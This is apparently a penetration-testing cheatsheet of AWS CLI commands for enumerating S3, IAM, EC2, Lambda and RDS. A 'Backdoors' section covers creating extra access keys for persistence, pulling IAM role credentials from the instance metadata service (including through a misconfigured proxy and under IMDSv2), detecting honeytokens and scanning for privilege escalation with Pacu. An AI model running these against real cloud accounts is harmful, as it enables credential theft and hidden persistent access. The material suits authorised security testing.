---
id: 88c82696-c45d-4b93-a380-ffab92c77c18
name: Amazon Web Services (AWS) CLI Tool Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T19:06:16.332785+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Amazon Web Services (AWS) CLI Tool Cheatsheet

# Authentication

**Command** ([[Set AWS programmatic keys for authentication (use --profile=<name> for a new profile)]]):

```bash
aws configure

```

# Open S3 bucket enumeration

**Command** ([[List the contents of an S3 bucket]]):

```bash
aws s3 ls s3://<bucketname>/ 

```

**Command** ([[Download contents of bucket]]):

```bash
aws s3 sync s3://bucketname s3-files-dir

```

# Account Information

**Command** ([[Get basic account info]]):

```bash
aws sts get-caller-identity

```

**Command** ([[aws iam list users]]):

```bash
aws iam list-users

```

**Command** ([[List IAM roles]]):

```bash
aws iam list-roles

```

**Command** ([[aws s3 list buckets]]):

```bash
aws s3 ls

```

# Virtual Machines

**Command** ([[List EC2 instances]]):

```bash
aws ec2 describe-instances

```

# WebApps & SQL

**Command** ([[List WebApps]]):

```bash
aws deploy list-applications

```

**Command** ([[List AWS RDS (SQL)]]):

```bash
aws rds describe-db-instances --region <region name>

```

**Command** ([[Knowing the VPC Security Group ID you can query the firewall rules to determine connectivity potential]]):

```bash
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>

```

# Serverless

**Command** ([[List Lambda Functions]]):

```bash
aws lambda list-functions --region <region>

```

**Command** ([[Look at environment variables set for secrets and analyze code]]):

```bash
aws lambda get-function --function-name <lambda function>

```

# Networking

**Command** ([[List DirectConnect (VPN) connections]]):

```bash
aws directconnect describe-connections

```

# Backdoors

**Command** ([[List access keys for a user]]):

```bash
aws iam list-access-keys --user-name <username>

```

**Command** ([[Backdoor account with second set of access keys]]):

```bash
aws iam create-access-key --user-name <username>

```

**Command** ([[Instance Metadata Service URL]]):

```bash
http://169.254.169.254/latest/meta-data

```

**Command** ([[Additional IAM creds possibly available here]]):

```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>

```

**Command** ([[Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured]]):

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo

```

**Command** ([[IMDS Version 2 has some protections but these commands can be used to access it]]):

```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"

```

# Other AWS Tools

WeirdAAL

https://github.com/carnal0wnage/weirdAAL

**Command** ([[Run recon against all AWS services to enumerate access for a set of keys]]):

```bash
python3 weirdAAL.py -m recon_all -t <name>

```

Pacu

AWS exploitation framework

https://github.com/RhinoSecurityLabs/pacu

**Command** ([[Install Pacu]]):

```bash
sudo apt-get install python3-pip
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
sudo bash install.sh

```

**Command** ([[Import AWS keys for a specific profile]]):

```bash
import_keys <profile name>

```

**Command** ([[Detect if keys are honey token keys]]):

```bash
run iam__detect_honeytokens

```

**Command** ([[Enumerate account information and permissions]]):

```bash
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
whoami

```

**Command** ([[Check for privilege escalation]]):

```bash
run iam__privesc_scan

```
